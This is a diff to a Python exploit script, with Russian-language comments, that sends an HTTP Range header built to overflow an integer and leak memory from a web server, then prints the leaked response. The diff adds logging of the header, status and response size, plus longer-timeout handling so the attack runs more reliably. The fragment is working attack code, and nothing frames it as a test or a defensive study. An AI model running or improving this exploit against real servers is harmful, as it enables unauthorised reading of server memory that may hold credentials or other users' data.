@@ -30,9 +30,18 @@ headers['Range'] = "bytes=-%d,-%d" % (
     n, 0x8000000000000000 - n)
 
 print(f"[*] Отправка Range запроса...")
+print(f"[*] Range заголовок: {headers['Range']}")
 try:
-    r = requests.get(url, headers=headers, timeout=timeout)
+    # Увеличиваем таймаут для Range запроса, так как уязвимость может обрабатываться дольше
+    r = requests.get(url, headers=headers, timeout=30)
+    print(f"[+] Получен ответ (статус: {r.status_code}, размер: {len(r.content)} байт)")
+    print("=" * 60)
     print(r.text)
+    print("=" * 60)
+except requests.exceptions.Timeout as e:
+    print(f"[-] Таймаут Range запроса: {e}")
+    print("[!] Это может быть нормальным для данной уязвимости - сервер может обрабатывать запрос долго")
+    sys.exit(1)
 except requests.exceptions.RequestException as e:
     print(f"[-] Ошибка Range запроса: {e}")
     sys.exit(1)
